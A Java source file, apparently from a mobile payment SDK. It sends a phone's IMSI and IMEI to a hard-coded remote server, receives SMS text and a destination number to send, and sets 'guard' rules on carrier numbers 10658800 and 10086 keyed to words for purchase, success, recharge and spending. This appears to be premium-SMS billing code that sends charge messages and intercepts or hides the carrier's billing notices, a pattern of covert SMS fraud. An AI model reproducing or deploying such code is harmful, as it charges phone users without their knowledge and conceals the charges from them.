package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * http://203.86.14.42:9900/recharges.do?cpid=d5ab84ee&imsi=460004014262557&imei=865308021063757&fee=1000&ext=yhsx100_10658424_18352329557&ua=Tm9raWE3MjUwLzEuMCAoMy4xNCkgUHJvZmlsZS9NSURQLTEuMCBDb25maWd1cmF0aW9uL0NMREMtMS4w
 * @author leoliu
 *
 */
public class XmwtMm5DynamicService implements IDynamicService{

	private static final String TYPE = "xmwtMm5";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEFAULTEXT = "yhsx100_10658424_18352329557";
	
	private static final String REQUESTMODEL = "cpid={cpid}&imsi={imsi}&imei={imei}&fee={fee}&ext={ext}&ua=Tm9raWE3MjUwLzEuMCAoMy4xNCkgUHJvZmlsZS9NSURQLTEuMCBDb25maWd1cmF0aW9uL0NMREMtMS4w";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String cpid = map.get("cpid");
			String fee = map.get("fee");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String ext = map.get("ext");
			
			if(ext == null || ext.length() == 0){
				ext = DEFAULTEXT;
			}
			
			String param = REQUESTMODEL.replace("{cpid}",cpid).replace("{fee}",fee).replace("{ext}",ext).replace("{imei}",imei).replace("{imsi}",imsi);
						
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 10){
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String status = jo.getString("status");
				
				if("0".equals(status)){
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(jo.getString("content"));
					sms.setSmsDest(jo.getString("num"));
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}else if("1".equals(status)){
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}else{
					return DynamicUtils.parseError("596");
				}
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
//		http://www.lenseen.com:8081/mmwn/get?cmd=3&price=10&g=99&imei=860174010602000&imsi=460030912121002&phone=13800138000
		String url = "http://203.86.14.42:9900/recharges.do";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "xmwtMm5");
		map.put("channel", "10B101a87654322");
		map.put("cpid", "90155556");
		map.put("fee", "800");
		map.put("imsi","460025399810364");
		map.put("imei","869460011612103");
		map.put("ext","mm8");
		
		System.out.println(new XmwtMm5DynamicService().dynamic(map));
		
		
	}

}
